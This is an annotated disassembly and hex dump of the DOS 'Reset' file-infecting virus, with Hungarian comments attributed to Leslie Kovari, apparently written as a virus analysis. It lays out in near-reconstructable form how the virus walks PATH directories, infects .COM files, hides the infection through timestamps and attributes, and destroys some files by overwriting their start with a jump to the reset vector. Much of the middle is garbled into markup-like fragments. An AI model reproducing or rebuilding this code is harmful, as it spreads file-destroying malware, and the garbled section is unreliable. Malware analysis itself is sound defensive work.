

Reset virus. Size 682 byte Hex: 02ac byte.		Comment by Leslie Kovari
								   (41) 21-033



Unassemble list:

114E:0100 E91F00	JMP	0122			;ugras a virus kezdetere
114E:0103 49		DEC	CX
114E:0104 60		DB	60
114E:0105 61		DB	61
114E:0106 6D		DB	6D
114E:0107 206120	AND	[BX+DI+20],AH
114E:010A 52		PUSH	DX
114E:010B 65		DB	65
114E:010C 7365		JNB	0173
114E:010E 7420		JZ	0130
114E:0110 56		PUSH	SI
114E:0111 49		DEC	CX
114E:0112 52		PUSH	DX
114E:0113 55		PUSH	BP
114E:0114 53		PUSH	BX
114E:0115 2124		AND	[SI],SP
114E:0117 BA0301	MOV	DX,0103 		;az eredeti fertozott
							;program kezdete
114E:011A B409		MOV	AH,09
114E:011C CD21		INT	21			;uzenet kepernyore
114E:011E B400		MOV	AH,00
114E:0120 CD20		INT	20			;exit to DOS

114E:0122 51		PUSH	CX			;stack-en marad

			;a kovetkezo utasitas operandusat fertozeskor
			;allitja be, igy mindig a helyes cimre mutat

114E:0123 BA1B03	MOV	DX,031B
114E:0126 FC		CLD				;elore
114E:0127 8BF2		MOV	SI,DX
114E:0129 81C60A00	ADD	SI,000A 		;SI=031b eredeti 3 byte
114E:012D BF0001	MOV	DI,0100 		;program eleje
114E:0130 B90300	MOV	CX,0003 		;3 byte
114E:0133 F3		REPZ
114E:0134 A4		MOVSB				;eredeti JMP 117
							;visszamasolasa
114E:0135 8BF2		MOV	SI,DX
114E:0137 B430		MOV	AH,30
114E:0139 CD21		INT	21			;DOS verzio szam lekerd.
114E:013B 3C00		CMP	AL,00
114E:013D 7503		JNZ	0142
114E:013F E9C701	JMP	0309			;ha 00-as verzio akkor
							;nem fertoz a virus s
							;futtatja az eredeti
							;programot
114E:0142 06		PUSH	ES
114E:0143 B42F		MOV	AH,2F
114E:0145 CD21		INT	21			;DTA. lekerdezese
114E:0147 899C0000	MOV	[SI+0000],BX		;BX= 0080 offset
114E:014B 8C840200	MOV	[SI+0002],ES		;eredeti DTA. mentese
114E:014F 07		POP	ES

			;DTA. beallitasa az ENTRY cimere /dir.-bol/
			;ide masolja a find first a file adatait

114E:0150 BA5F00	MOV	DX,005F 		;DX=037a
114E:0153 90		NOP
114E:0154 03D6		ADD	DX,SI
114E:0156 B41A		MOV	AH,1A
114E:0158 CD21		INT	21			;DTA. letrehozasa
							;037a-tol uj cimre
114E:015A 06		PUSH	ES
114E:015B 56		PUSH	SI
114E:015C 8E062C00	MOV	ES,[002C]		;kornyezet szegmense
114E:0160 BF0000	MOV	DI,0000 		;elejetol ES:DI fog a
							;kovetkezo dir.-ra mu-
							;tatni
114E:0163 5E		POP	SI
114E:0164 56		PUSH	SI
114E:0165 81C61A00	ADD	SI,001A 		;ezen a cimen levo
							;stringet keresi a
							;kornyezetbe PATH
114E:0169 AC		LODSB				;AL=DS:[SI],SI++
114E:016A B90080	MOV	CX,8000 		;32 kbyte
114E:016D F2		REPNZ
114E:016E AE		SCASB				;megkeresi a kovetke-
							;zo P betut
114E:016F B90400	MOV	CX,0004 		;a PATH feliratot keresi
114E:0172 AC		LODSB
114E:0173 AE		SCASB				;betunkent hasonlitja
114E:0174 75ED		JNZ	0163			;ha nem egyezik a DI.
							;karakter /kov.betu/
114E:0176 E2FA		LOOP	0172			;egyezik beolvassa es
							;osszehasonlitja a tobbi
							;betut is
114E:0178 5E		POP	SI
114E:0179 07		POP	ES			;ES:DI mutat az elso
							;PATH-ra
114E:017A 89BC1600	MOV	[SI+0016],DI		;a PATH= szo utani file
							;spec. cimenek mentese
							;PATH mutato
114E:017E 8BFE		MOV	DI,SI			;SI=031b
114E:0180 81C71F00	ADD	DI,001F 		;DI=033a
114E:0184 8BDE		MOV	BX,SI			;BX=031b ezutan BX mu-
							;tat az adatokra
114E:0186 81C61F00	ADD	SI,001F 		;SI=033a
114E:018A 8BFE		MOV	DI,SI			;DI=033a
114E:018C EB3A		JMP	01C8

			;A kovetkezo PATH-ban megadott aldirectoryt
			;File Path-ra masolja, igy a kovetkezo file-t
			;ebben az aldirectoryban keresi

114E:018E 83BC160000	CMP	WORD PTR [SI+0016],+00	;
114E:0193 7503		JNZ	0198
114E:0195 E96301	JMP	02FB			;ha nincs osveny megadva
114E:0198 1E		PUSH	DS
114E:0199 56		PUSH	SI
114E:019A 26		ES:
114E:019B 8E1E2C00	MOV	DS,[002C]		;kornyezet szegmense
114E:019F 8BFE		MOV	DI,SI			;DI=033a
114E:01A1 26		ES:
114E:01A2 8BB51600	MOV	SI,[DI+0016]		;a kornyezetbol a path
							;masolasa ha az aktualis
							;konyvtarban nem talalt
							;fertozheto file-t
							;a PATH= utanra mutat
							;az SI
114E:01A6 81C71F00	ADD	DI,001F
114E:01AA AC		LODSB				;beolvas a kornyezetbol
							;a 0029. byte-ot
114E:01AB 3C3B		CMP	AL,3B			;pontosvesszo ?
114E:01AD 740A		JZ	01B9			;igen
114E:01AF 3C00		CMP	AL,00			;PATH vege ? nem lesz
							;tobb
114E:01B1 7403		JZ	01B6			;igen
114E:01B3 AA		STOSB				;letarol 033a-tol
114E:01B4 EBF4		JMP	01AA

114E:01B6 BE0000	MOV	SI,0000
114E:01B9 5B		POP	BX			;BX=regi SI BX mutat
							;az adatokra
114E:01BA 1F		POP	DS
114E:01BB 89B71600	MOV	[BX+0016],SI

			;a kovetkezo PATH-ban adott dir. mar atmasolva

114E:01BF 807DFF5C	CMP	BYTE PTR [DI-01],5C	; \ jel ?
114E:01C3 7403		JZ	01C8			;igen
114E:01C5 B05C		MOV	AL,5C			;egyebkent \ iras

			;egy aldir. kiertekelese, eloszor az aktualis, majd
			;a file path -ra masolt aldir. vegignezese, fertozes
			;DI a file path-ba irt aldir. neve utani poz.-ra mu-
			;tat

			;COM file keresese

114E:01C7 AA		STOSB				;\ jel beirasa
114E:01C8 89BF1800	MOV	[BX+0018],DI		;ide kell majd a
							;file nevet masolni,
							;az aldir. neve utan
114E:01CC 8BF3		MOV	SI,BX			;SI=031b   DI=033d
114E:01CE 81C61000	ADD	SI,0010 		;SI=032b
114E:01D2 B90600	MOV	CX,0006
114E:01D5 F3		REPZ
114E:01D6 A4		MOVSB				;a *.COM szoveg beirasa
							;a PATH= szoveg utan
114E:01D7 8BF3		MOV	SI,BX
114E:01D9 B44E		MOV	AH,4E			;a file adatai a DTA.
							;alltal foglalt teru-
							;letre
114E:01DB BA1F00	MOV	DX,001F
114E:01DE 90		NOP
114E:01DF 03D6		ADD	DX,SI
114E:01E1 B90300	MOV	CX,0003
114E:01E4 CD21		INT	21			;elso file bejegyzes ke-
							;resese, az it. aktivi-
							;zalasa utan felhozza a
							;filemeretet, attrib.ot
							;keletkezes datumat s
							;idejet is!
114E:01E6 EB04		JMP	01EC			;vizsgalatra
114E:01E8 B44F		MOV	AH,4F
114E:01EA CD21		INT	21			;kovetkezo file bejegy-
							;zes keresese
114E:01EC 7302		JNB	01F0			;ha nincs hiba
114E:01EE EB9E		JMP	018E			;hiba eseten -ha nem
							;talal tobb COM file-t
							;mas aldirt keres
			;mar talalt COM file-t, az adataival az entry fel
			;van toltve, a file ellenorzese es fertozese
			;kovetkezik

114E:01F0 8B847500	MOV	AX,[SI+0075]		;a keletkezesi ido AX-be
							;SI=0390
114E:01F4 241F		AND	AL,1F			;maszk 31 -el
114E:01F6 3C1F		CMP	AL,1F			;ha 31 akkor mar ferto-
							;zott a file!
114E:01F8 74EE		JZ	01E8			;fertozott kovetkezo
							;file-t keresi
114E:01FA 81BC790000FA	CMP	WORD PTR [SI+0079],FA00
114E:0200 77E6		JA	01E8			;ha > a file meret
							;64000 byte-nal
114E:0202 83BC79000A	CMP	WORD PTR [SI+0079],+0A
114E:0207 72DF		JB	01E8			;ha < 10="" byte="" nal="" 114e:0209="" 8bbc1800="" mov="" di,[si+0018]="" ;di="033a" ;megvan="" a="" kivalasztott="" file="" ;a="" file="" nevet="" a="" filespec="" utan="" kell="" masolni="" 114e:020d="" 56="" push="" si="" ;di="" mutat="" a="" filespec.re,="" ;path="*.COM" 114e:020e="" 81c67d00="" add="" si,007d="" ;si="0398" 114e:0212="" ac="" lodsb="" ;atmasolja="" a="" filenevet="" ;/megkeresett="" elso="" v.="" ;x.edik="" bejegyzest/="" 114e:0213="" aa="" stosb="" 114e:0214="" 3c00="" cmp="" al,00="" ;vegere="" ert="" nevle-="" ;zaro="" nullaig="" masol="" 114e:0216="" 75fa="" jnz="" 0212="" ;nem="" 114e:0218="" 5e="" pop="" si="" ;si="" ujra="" az="" adatokra="" mu-="" ;tat="" ;a="" file="" egyes="" eredeti="" informacioinak="" megorzese="" ;hogy="" a="" fertozese="" ne="" tunjon="" fel="" ;minek="" a="" file="" attr.="" megegyszer="" lekerdezni?="" 114e:0219="" b80043="" mov="" ax,4300="" 114e:021c="" ba1f00="" mov="" dx,001f="" ;ds:dx="filespec." 114e:021f="" 90="" nop="" 114e:0220="" 03d6="" add="" dx,si="" ;dx="031b" 114e:0222="" cd21="" int="" 21="" ;attributum="" lekerdezese="" ;7.6.5.4.3.2.1.0.="" ;x="" x="" a="" d="" v="" s="" h="" r="" 114e:0224="" 898c0800="" mov="" [si+0008],cx="" ;attributum="" 114e:0228="" b80143="" mov="" ax,4301="" 114e:022b="" 81e1feff="" and="" cx,fffe="" ;ha="" read="" only="" akkor="" arc.="" ;ra="" valtoztatja="" 114e:022f="" ba1f00="" mov="" dx,001f="" 114e:0232="" 90="" nop="" 114e:0233="" 03d6="" add="" dx,si="" ;dx="033a" 114e:0235="" cd21="" int="" 21="" ;attributum="" beallitasa="" ;file="" nyitasa="" 114e:0237="" b8023d="" mov="" ax,3d02="" 114e:023a="" ba1f00="" mov="" dx,001f="" 114e:023d="" 90="" nop="" 114e:023e="" 03d6="" add="" dx,si="" ;ds:dx="filespec." 114e:0240="" cd21="" int="" 21="" ;file="" nyitasa="" i/o="" ra="" 114e:0242="" 7303="" jnb="" 0247="" 114e:0244="" e9a500="" jmp="" 02ec="" ;hiba="" eseten="" nincs="" ;fertozes="" 114e:0247="" 8bd8="" mov="" bx,ax="" ;handle="" ;a="" file="" idejenek="" lekerdezese="" de="" ez="" is="" megtalalhato="" az="" ;entry="" teruleten="" 114e:0249="" b80057="" mov="" ax,5700="" 114e:024c="" cd21="" int="" 21="" ;file="" letrehozasi="" datum="" ;es="" ido="" bekerese="" 114e:024e="" 898c0400="" mov="" [si+0004],cx="" ;ido="" ch-ora="" cl-perc="" dh-sec="" dl-1/100="" 114e:0252="" 89940600="" mov="" [si+0006],dx="" ;datum="" 114e:0256="" b42c="" mov="" ah,2c="" 114e:0258="" cd21="" int="" 21="" ;rendszerido="" bekerese="" ;annak="" eldontese="" hogy="" a="" filet="" tonkretegye-e="" ;ha="" a="" masodperc="" 7="" akkor="" tonkreteszi="" ktualis/="" 114e:025a="" 80e607="" and="" dh,07="" ;sec="7" 114e:025d="" 7510="" jnz="" 026f="" ;nem="" -="" nem="" tesz="" tonkre!="" ;file="" tonkretetele="" 114e:025f="" b440="" mov="" ah,40="" 114e:0261="" b90500="" mov="" cx,0005="" 114e:0264="" 8bd6="" mov="" dx,si="" ;reset="" 114e:0266="" 81c28a00="" add="" dx,008a="" ;dx="03a7" :="" jmp="" f000:fff0="" 114e:026a="" cd21="" int="" 21="" ;file="" elejere="" ir="" 5="" byte="" ;-ot="" a="" reset="" re="" ugrast!="" 114e:026c="" eb65="" jmp="" 02d3="" 114e:026e="" 90="" nop="" ;fertozes="" ;az="" eredeti="" 3="" byte="" megorzese="" hogy="" kesobb="" meg="" futtatni="" ;lehessen="" 114e:026f="" b43f="" mov="" ah,3f="" 114e:0271="" b90300="" mov="" cx,0003="" 114e:0274="" ba0a00="" mov="" dx,000a="" 114e:0277="" 90="" nop="" 114e:0278="" 03d6="" add="" dx,si="" ;ds:dx="puffer" cima="" dta="" 114e:027a="" cd21="" int="" 21="" ;a="" program="" eredeti="" elso="" ;3="" byte-jat="" beolvassa="" 114e:027c="" 7255="" jb="" 02d3="" ;ha="" hiba="" van="" 114e:027e="" 3d0300="" cmp="" ax,0003="" ;megvolt="" a="" 3="" byte="" 114e:0281="" 7550="" jnz="" 02d3="" ;nem="" ;file="" vegere="" allas="" az="" uj="" cimek="" kiszamitasa="" 114e:0283="" b80242="" mov="" ax,4202="" 114e:0286="" b90000="" mov="" cx,0000="" 114e:0289="" ba0000="" mov="" dx,0000="" 114e:028c="" cd21="" int="" 21="" ;file="" vegere="" pozicional="" 114e:028e="" 7243="" jb="" 02d3="" ;ha="" hiba="" volt="" -nem="" ;nagyon="" lehet="" hiba!="" ;file="" elejere="" irando="" jmp="" operandus="" kiszamitasa="" 114e:0290="" 8bc8="" mov="" cx,ax="" ;ax-ben="" filehossz="" 114e:0292="" 2d0300="" sub="" ax,0003="" ;ax-ben="" eltolas="" a="" jmp="" ;utasitashoz="" amit="" a="" ;file="" elejere="" fog="" irni="" ;igy="" a="" jmp="" a="" file="" mos-="" ;tani="" vege="" utani="" bytera="" ;fog="" mutatni="" 114e:0295="" 89840e00="" mov="" [si+000e],ax="" ;jmp="" cim="" ;az="" uj="" file-on="" beluli="" adatterulet="" cimenek="" ki-="" ;szamitasa="" es="" beallitasa="" 114e:0299="" 81c1f902="" add="" cx,02f9="" ;az="" uj="" file-on="" beluli="" ;adatteruletre="" mutat="" 114e:029d="" 8bfe="" mov="" di,si="" 114e:029f="" 81eff701="" sub="" di,01f7="" ;virus="" elso="" utasitasa-="" ;nak="" operandusanak="" ;cime="" 114e:02a3="" 890d="" mov="" [di],cx="" ;ide="" irja="" az="" adatterulet="" ;cimet="" ;file="" moge="" masolja="" magat="" ;filemutato="" a="" file="" vegere="" mutat="" 114e:02a5="" b440="" mov="" ah,40="" 114e:02a7="" b98802="" mov="" cx,0288="" ;a="" virus="" hossza="" 114e:02aa="" 8bd6="" mov="" dx,si="" ;virus="" elso="" bytejara="" ;mutat="" 114e:02ac="" 81eaf901="" sub="" dx,01f9="" 114e:02b0="" cd21="" int="" 21="" ;a="" fertozes="" onmagat="" a="" ;program="" a="" fertozendo="" ;program="" moge="" irja="" 114e:02b2="" 721f="" jb="" 02d3="" ;hiba="" eseten="" 114e:02b4="" 3d8802="" cmp="" ax,0288="" ;kiirta="" onmagat="" 114e:02b7="" 751a="" jnz="" 02d3="" ;igen="" ;az="" elso="" 3="" byte="" atallitasa,="" egy="" file="" ;vegere="" mutato="" ugro="" utasitasra="" 114e:02b9="" b80042="" mov="" ax,4200="" 114e:02bc="" b90000="" mov="" cx,0000="" 114e:02bf="" ba0000="" mov="" dx,0000="" 114e:02c2="" cd21="" int="" 21="" ;file="" pointer="" a="" vegere="" 114e:02c4="" 720d="" jb="" 02d3="" ;ha="" volt="" hiba="" -nem="" le-="" ;het="" hiba!="" 114e:02c6="" b440="" mov="" ah,40="" 114e:02c8="" b90300="" mov="" cx,0003="" 114e:02cb="" 8bd6="" mov="" dx,si="" 114e:02cd="" 81c20d00="" add="" dx,000d="" ;dx="0329" ugro="" utasitasra="" ;mutat="" 114e:02d1="" cd21="" int="" 21="" ;3="" byte="" kiirasa="" a="" fileba="" ;az="" eredeti="" ido="" -mar="" a="" fertozesjelzessel="" egyutt-="" ;visszaallitasa="" 114e:02d3="" 8b940600="" mov="" dx,[si+0006]="" ;datum="" 114e:02d7="" 8b8c0400="" mov="" cx,[si+0004]="" ;ido="" 114e:02db="" 81e1e0ff="" and="" cx,ffe0="" ;sec="0" -felesleges!="" 114e:02df="" 81c91f00="" or="" cx,001f="" ;sec="1f" azaz="" 31,="" igy="" ;jelzi="" hogy="" mar="" ferto-="" ;zott="" egy="" file="" a="" sec.="" ;-et="" 31-re="" allitja="" a="" ;file="" bejegyzesben="" ;="" hour="" |="" min.="" |="" sec.="" ;1111="" 1|111="" 111|0="" 0000="" 114e:02e3="" b80157="" mov="" ax,5701="" 114e:02e6="" cd21="" int="" 21="" ;file="" keletk.="" ido="" beall.="" ;file="" zarasa="" 114e:02e8="" b43e="" mov="" ah,3e="" 114e:02ea="" cd21="" int="" 21="" ;file="" zarasa="" ;eredeti="" attributum="" visszaallitasa="" 114e:02ec="" b80143="" mov="" ax,4301="" 114e:02ef="" 8b8c0800="" mov="" cx,[si+0008]="" ;cx="0020" rc./="" 114e:02f3="" ba1f00="" mov="" dx,001f="" 114e:02f6="" 90="" nop="" ;dta.="" visszaallitasa="" az="" eredeti="" cimre="" 114e:02f7="" 03d6="" add="" dx,si="" 114e:02f9="" cd21="" int="" 21="" ;file="" attr.="" beallitasa="" 114e:02fb="" 1e="" push="" ds="" 114e:02fc="" b41a="" mov="" ah,1a="" 114e:02fe="" 8b940000="" mov="" dx,[si+0000]="" 114e:0302="" 8e9c0200="" mov="" ds,[si+0002]="" 114e:0306="" cd21="" int="" 21="" ;dta.="" megadasa="" 114e:0308="" 1f="" pop="" ds="" ;az="" eredeti="" program="" futtatasa="" 114e:0309="" 59="" pop="" cx="" 114e:030a="" 33c0="" xor="" ax,ax="" ;reg.="" nullazasa="" 114e:030c="" 33db="" xor="" bx,bx="" 114e:030e="" 33d2="" xor="" dx,dx="" 114e:0310="" 33f6="" xor="" si,si="" 114e:0312="" bf0001="" mov="" di,0100="" 114e:0315="" 57="" push="" di="" ;elteszi="" a="" 0100="" offsetet="" ;hogy="" a="" ret="" elo="" tudja="" ;venni="" es="" odaugrik="" 114e:0316="" 33ff="" xor="" di,di="" 114e:0318="" c2ffff="" ret="" ffff="" ;ugras="" a="" 0100-as="" offset-="" ;re,="" ott="" mar="" az="" eredeti="" ;jmp="" 117="" utasitas="" van,="" ;igy="" vegrehajtodik="" az="" ;eredeti="" prg.="" ;sp-="" hogy="" minek="" 114e:031b="" 800046="" add="" byte="" ptr="" [bx+si],46="" 114e:031e="" 0d2001="" or="" ax,0120="" 114e:0321="" 2100="" and="" [bx+si],ax="" 114e:0323="" 2000="" and="" [bx+si],al="" 114e:0325="" eb15="" jmp="" 033c="" 114e:0327="" 90="" nop="" 114e:0328="" e91f00="" jmp="" 034a="" 114e:032b="" 2a2e434f="" sub="" ch,[4f43]="" 114e:032f="" 4d="" dec="" bp="" 114e:0330="" 0028="" add="" [bx+si],ch="" 114e:0332="" 004703="" add="" [bx+03],al="" 114e:0335="" 50="" push="" ax="" 114e:0336="" 41="" inc="" cx="" 114e:0337="" 54="" push="" sp="" 114e:0338="" 48="" dec="" ax="" 114e:0339="" 3d5245="" cmp="" ax,4552="" 114e:033c="" 53="" push="" bx="" 114e:033d="" 45="" inc="" bp="" 114e:033e="" 54="" push="" sp="" 114e:033f="" 2e="" cs:="" 114e:0340="" 43="" inc="" bx="" 114e:0341="" 4f="" dec="" di="" 114e:0342="" 4d="" dec="" bp="" 114e:0343="" 0000="" add="" [bx+si],al="" 114e:0345="" 0000="" add="" [bx+si],al="" 114e:0347="" 4d="" dec="" bp="" 114e:0348="" 004449="" add="" [si+49],al="" 114e:034b="" 54="" push="" sp="" 114e:034c="" 2e="" cs:="" 114e:034d="" 43="" inc="" bx="" 114e:034e="" 4f="" dec="" di="" 114e:034f="" 4d="" dec="" bp="" 114e:0350="" 0000="" add="" [bx+si],al="" 114e:0352="" 2020="" and="" [bx+si],ah="" 114e:0354="" 2020="" and="" [bx+si],ah="" 114e:0356="" 2020="" and="" [bx+si],ah="" 114e:0358="" 2020="" and="" [bx+si],ah="" 114e:035a="" 2020="" and="" [bx+si],ah="" 114e:035c="" 2020="" and="" [bx+si],ah="" 114e:035e="" 2020="" and="" [bx+si],ah="" 114e:0360="" 2020="" and="" [bx+si],ah="" 114e:0362="" 2020="" and="" [bx+si],ah="" 114e:0364="" 2020="" and="" [bx+si],ah="" 114e:0366="" 2020="" and="" [bx+si],ah="" 114e:0368="" 2020="" and="" [bx+si],ah="" 114e:036a="" 2020="" and="" [bx+si],ah="" 114e:036c="" 2020="" and="" [bx+si],ah="" 114e:036e="" 2020="" and="" [bx+si],ah="" 114e:0370="" 2020="" and="" [bx+si],ah="" 114e:0372="" 2020="" and="" [bx+si],ah="" 114e:0374="" 2020="" and="" [bx+si],ah="" 114e:0376="" 2020="" and="" [bx+si],ah="" 114e:0378="" 2020="" and="" [bx+si],ah="" 114e:037a="" 013f="" add="" [bx],di="" 114e:037c="" 3f="" aas="" 114e:037d="" 3f="" aas="" 114e:037e="" 3f="" aas="" 114e:037f="" 3f="" aas="" 114e:0380="" 3f="" aas="" 114e:0381="" 3f="" aas="" 114e:0382="" 3f="" aas="" 114e:0383="" 43="" inc="" bx="" 114e:0384="" 4f="" dec="" di="" 114e:0385="" 4d="" dec="" bp="" 114e:0386="" 0301="" add="" ax,[bx+di]="" 114e:0388="" 0000="" add="" [bx+si],al="" 114e:038a="" 002e8b26="" add="" [268b],ch="" 114e:038e="" 68="" db="" 68="" 114e:038f="" 2020="" and="" [bx+si],ah="" 114e:0391="" 0121="" add="" [bx+di],sp="" 114e:0393="" 0022="" add="" [bp+si],ah="" 114e:0395="" 0000="" add="" [bx+si],al="" 114e:0397="" 005245="" add="" [bp+si+45],dl="" 114e:039a="" 53="" push="" bx="" 114e:039b="" 45="" inc="" bp="" 114e:039c="" 54="" push="" sp="" 114e:039d="" 2e="" cs:="" 114e:039e="" 43="" inc="" bx="" 114e:039f="" 4f="" dec="" di="" 114e:03a0="" 4d="" dec="" bp="" 114e:03a1="" 0000="" add="" [bx+si],al="" 114e:03a3="" 4d="" dec="" bp="" 114e:03a4="" 00ea="" add="" dl,ch="" 114e:03a6="" f0="" lock="" 114e:03a7="" ff00="" inc="" word="" ptr="" [bx+si]="" 114e:03a9="" f0="" lock="" 114e:03aa="" 16="" push="" ss="" 114e:03ab="" 7c14="" jl="" 03c1="" dump="" list:="" 114e:0000="" cd="" 20="" 00="" a0="" 00="" 9a="" f0="" fe-1d="" f0="" f4="" 02="" 84="" 0d="" 2f="" 03="" .="" ............/.="" 114e:0010="" 84="" 0d="" bc="" 02="" 84="" 0d="" 4c="" 0d-01="" 03="" 01="" 00="" 02="" ff="" ff="" ff="" ......l.........="" 114e:0020="" ff="" ff="" ff="" ff="" ff="" ff="" ff="" ff-ff="" ff="" ff="" ff="" 44="" 11="" 4c="" 01="" ............d.l.="" 114e:0030="" be="" 10="" 14="" 00="" 18="" 00="" 4e="" 11-ff="" ff="" ff="" ff="" 00="" 00="" 00="" 00="" ......n.........="" 114e:0040="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ................="" 114e:0050="" cd="" 21="" cb="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 20="" 20="" 20="" .!...........="" 114e:0060="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20-00="" 00="" 00="" 00="" 00="" 20="" 20="" 20="" .....="" 114e:0070="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ........="" 114e:0080="" 01="" 20="" 0d="" 65="" 73="" 65="" 74="" 76-2e="" 63="" 6f="" 6d="" 20="" 0d="" 63="" 3a="" .="" .esetv.com="" .c:="" 114e:0090="" 0d="" 65="" 6b="" 5c="" 64="" 62="" 61="" 73-65="" 3b="" 63="" 3a="" 5c="" 6e="" 79="" 65="" .ek\dbase;c:\nye="" 114e:00a0="" 6c="" 76="" 65="" 6b="" 5c="" 63="" 6c="" 69-70="" 70="" 65="" 72="" 3b="" 63="" 3a="" 5c="" lvek\clipper;c:\="" 114e:00b0="" 6e="" 79="" 65="" 6c="" 76="" 65="" 6b="" 5c-66="" 6c="" 61="" 73="" 68="" 3b="" 63="" 3a="" nyelvek\flash;c:="" 114e:00c0="" 5c="" 6e="" 79="" 65="" 6c="" 76="" 65="" 6b-5c="" 70="" 61="" 73="" 63="" 61="" 6c="" 3b="" \nyelvek\pascal;="" 114e:00d0="" 63="" 3a="" 5c="" 75="" 74="" 69="" 6c="" 0d-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" c:\util.........="" 114e:00e0="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ................="" 114e:00f0="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" 00-00="" 00="" 00="" 00="" 00="" 00="" 00="" 00="" ................="" 114e:0100="" e9="" 1f="" 00="" 49="" 60="" 61="" 6d="" 20-61="" 20="" 52="" 65="" 73="" 65="" 74="" 20="" ...i`am="" a="" reset="" 114e:0110="" 56="" 49="" 52="" 55="" 53="" 21="" 24="" ba-03="" 01="" b4="" 09="" cd="" 21="" b4="" 00="" virus!$......!..="" 114e:0120="" cd="" 20="" 51="" ba="" 1b="" 03="" fc="" 8b-f2="" 81="" c6="" 0a="" 00="" bf="" 00="" 01="" .="" q.............="" 114e:0130="" b9="" 03="" 00="" f3="" a4="" 8b="" f2="" b4-30="" cd="" 21="" 3c="" 00="" 75="" 03="" e9=""><.u.. 114e:0140="" c7="" 01="" 06="" b4="" 2f="" cd="" 21="" 89-9c="" 00="" 00="" 8c="" 84="" 02="" 00="" 07="" ..../.!.........="" 114e:0150="" ba="" 5f="" 00="" 90="" 03="" d6="" b4="" 1a-cd="" 21="" 06="" 56="" 8e="" 06="" 2c="" 00="" ._.......!.v..,.="" 114e:0160="" bf="" 00="" 00="" 5e="" 56="" 81="" c6="" 1a-00="" ac="" b9="" 00="" 80="" f2="" ae="" b9="" ...^v...........="" 114e:0170="" 04="" 00="" ac="" ae="" 75="" ed="" e2="" fa-5e="" 07="" 89="" bc="" 16="" 00="" 8b="" fe="" ....u...^.......="" 114e:0180="" 81="" c7="" 1f="" 00="" 8b="" de="" 81="" c6-1f="" 00="" 8b="" fe="" eb="" 3a="" 83="" bc="" .............:..="" 114e:0190="" 16="" 00="" 00="" 75="" 03="" e9="" 63="" 01-1e="" 56="" 26="" 8e="" 1e="" 2c="" 00="" 8b="" ...u..c..v&..,..="" 114e:01a0="" fe="" 26="" 8b="" b5="" 16="" 00="" 81="" c7-1f="" 00="" ac="" 3c="" 3b="" 74="" 0a="" 3c=""></.u..><>< 114e:01b0="" 00="" 74="" 03="" aa="" eb="" f4="" be="" 00-00="" 5b="" 1f="" 89="" b7="" 16="" 00="" 80="" .t.......[......="" 114e:01c0="" 7d="" ff="" 5c="" 74="" 03="" b0="" 5c="" aa-89="" bf="" 18="" 00="" 8b="" f3="" 81="" c6="" }.\t..\.........="" 114e:01d0="" 10="" 00="" b9="" 06="" 00="" f3="" a4="" 8b-f3="" b4="" 4e="" ba="" 1f="" 00="" 90="" 03="" ..........n.....="" 114e:01e0="" d6="" b9="" 03="" 00="" cd="" 21="" eb="" 04-b4="" 4f="" cd="" 21="" 73="" 02="" eb="" 9e="" .....!...o.!s...="" 114e:01f0="" 8b="" 84="" 75="" 00="" 24="" 1f="" 3c="" 1f-74="" ee="" 81="" bc="" 79="" 00="" 00="" fa=""><.t...y... 114e:0200="" 77="" e6="" 83="" bc="" 79="" 00="" 0a="" 72-df="" 8b="" bc="" 18="" 00="" 56="" 81="" c6="" w...y..r.....v..="" 114e:0210="" 7d="" 00="" ac="" aa="" 3c="" 00="" 75="" fa-5e="" b8="" 00="" 43="" ba="" 1f="" 00="" 90=""></.t...y...><.u.^..c.... 114e:0220="" 03="" d6="" cd="" 21="" 89="" 8c="" 08="" 00-b8="" 01="" 43="" 81="" e1="" fe="" ff="" ba="" ...!......c.....="" 114e:0230="" 1f="" 00="" 90="" 03="" d6="" cd="" 21="" b8-02="" 3d="" ba="" 1f="" 00="" 90="" 03="" d6="" ......!..="......" 114e:0240="" cd="" 21="" 73="" 03="" e9="" a5="" 00="" 8b-d8="" b8="" 00="" 57="" cd="" 21="" 89="" 8c="" .!s........w.!..="" 114e:0250="" 04="" 00="" 89="" 94="" 06="" 00="" b4="" 2c-cd="" 21="" 80="" e6="" 07="" 75="" 10="" b4="" .......,.!...u..="" 114e:0260="" 40="" b9="" 05="" 00="" 8b="" d6="" 81="" c2-8a="" 00="" cd="" 21="" eb="" 65="" 90="" b4="" @..........!.e..="" 114e:0270="" 3f="" b9="" 03="" 00="" ba="" 0a="" 00="" 90-03="" d6="" cd="" 21="" 72="" 55="" 3d="" 03="" .........!ru="." 114e:0280="" 00="" 75="" 50="" b8="" 02="" 42="" b9="" 00-00="" ba="" 00="" 00="" cd="" 21="" 72="" 43="" .up..b.......!rc="" 114e:0290="" 8b="" c8="" 2d="" 03="" 00="" 89="" 84="" 0e-00="" 81="" c1="" f9="" 02="" 8b="" fe="" 81="" ..-.............="" 114e:02a0="" ef="" f7="" 01="" 89="" 0d="" b4="" 40="" b9-88="" 02="" 8b="" d6="" 81="" ea="" f9="" 01="" ......@.........="" 114e:02b0="" cd="" 21="" 72="" 1f="" 3d="" 88="" 02="" 75-1a="" b8="" 00="" 42="" b9="" 00="" 00="" ba="" .!r.="..u...B...." 114e:02c0="" 00="" 00="" cd="" 21="" 72="" 0d="" b4="" 40-b9="" 03="" 00="" 8b="" d6="" 81="" c2="" 0d="" ...!r..@........="" 114e:02d0="" 00="" cd="" 21="" 8b="" 94="" 06="" 00="" 8b-8c="" 04="" 00="" 81="" e1="" e0="" ff="" 81="" ..!.............="" 114e:02e0="" c9="" 1f="" 00="" b8="" 01="" 57="" cd="" 21-b4="" 3e="" cd="" 21="" b8="" 01="" 43="" 8b="" .....w.!.="">.!..C.
114E:02F0  8C 08 00 BA 1F 00 90 03-D6 CD 21 1E B4 1A 8B 94   ..........!.....
114E:0300  00 00 8E 9C 02 00 CD 21-1F 59 33 C0 33 DB 33 D2   .......!.Y3.3.3.
114E:0310  33 F6 BF 00 01 57 33 FF-C2 FF FF 80 00 46 0D 20   3....W3......F.
